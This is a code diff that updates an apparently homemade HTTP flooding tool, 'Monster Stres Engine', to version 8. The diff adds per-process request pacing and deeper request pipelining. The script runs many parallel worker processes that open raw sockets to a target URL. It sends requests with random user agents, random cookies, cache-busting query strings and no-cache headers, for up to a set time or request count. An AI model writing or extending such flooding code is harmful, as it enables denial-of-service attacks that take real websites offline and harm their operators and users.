@@ -6,8 +6,8 @@ import string
 import socket
 import ssl
 
-# Monster Stres Engine V7 (WRK-Style) - Dual Limit Edition
-# Supported: Time-limit (Flood) and Request-limit (Visitors)
+# Monster Stres Engine V8 Platinum (Pacing Edition)
+# Professional Grade: Time/Volume Limits + RPS Control (Pacing)
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
@@ -17,7 +17,7 @@ USER_AGENTS = [
 def get_random_string(length=8):
     return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
 
-def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val):
+def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer):
     from urllib.parse import urlparse
     try:
         parsed = urlparse(target_url)
@@ -30,7 +30,7 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
     target_port = int(port) if port else (443 if scheme == 'https' else 80)
     
     while True:
-        # CHECK LIMITS
+        # GLOBAL LIMITS
         if limit_type == 'time' and time.time() >= end_time: break
         if limit_type == 'req' and shared_req.value >= limit_val: break
 
@@ -50,10 +50,14 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
             s.settimeout(1)
 
             # PIPELINING LOOP
-            for _ in range(50):
+            for _ in range(100):
                 if limit_type == 'time' and time.time() >= end_time: break
                 if limit_type == 'req' and shared_req.value >= limit_val: break
                 
+                # RPS PACING
+                if rps_pacer > 0:
+                    time.sleep(rps_pacer)
+
                 curr_path = path
                 if mode in ['3', '4']:
                     sep = '&' if '?' in path else '?'
@@ -72,6 +76,7 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                     "Connection: keep-alive\r\n"
                     "Accept-Encoding: gzip\r\n"
                     f"Cookie: _ga={random.randint(1,9999)}\r\n"
+                    "Cache-Control: no-cache\r\n"
                 )
                 
                 if method == "POST":
@@ -101,27 +106,36 @@ def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shar
                 except: pass
 
 def main():
-    if len(sys.argv) < 7:
+    if len(sys.argv) < 8:
         sys.exit(1)
 
-    url, th_count, limit_val, port, mode, limit_type = sys.argv[1:7]
+    url, th_count, limit_val, port, mode, limit_type, rps = sys.argv[1:8]
     th_count = int(th_count)
     limit_val = int(limit_val)
+    rps = int(rps)
 
     shared_req = multiprocessing.Value('i', 0)
     shared_bytes = multiprocessing.Value('Q', 0)
     shared_err = multiprocessing.Value('i', 0)
 
-    # If time based, set end_time. If req based, end_time is far in future.
-    end_time = time.time() + limit_val if limit_type == 'time' else time.time() + 86400 # 24h safety
+    # Calculate Pacer Delay per Process
+    # rps_pacer is the delay between requests in a single thread
+    rps_pacer = 0
+    if rps > 0:
+        rps_per_th = rps / th_count
+        if rps_per_th > 0:
+            rps_pacer = 1.0 / rps_per_th
+
+    end_time = time.time() + limit_val if limit_type == 'time' else time.time() + 86400 * 7
     
-    print(f"[*] Engine Active | Mode: {limit_type.upper()} LIMIT")
+    label = f"{rps} RPS" if rps > 0 else "MAX SPEED"
+    print(f"[*] Engine V8 PLATINUM | Mode: {limit_type.upper()} | Pacing: {label}")
     print(f"[*] Target: {url} | Workers: {th_count}")
     sys.stdout.flush()
 
     processes = []
     for _ in range(th_count):
-        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val))
+        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err, limit_type, limit_val, rps_pacer))
         p.daemon = True
         p.start()
         processes.append(p)
@@ -130,7 +144,6 @@ def main():
     last_bytes = 0
     try:
         while True:
-            # TERMINATION CHECK
             if limit_type == 'time' and time.time() >= end_time: break
             if limit_type == 'req' and shared_req.value >= limit_val: break
             
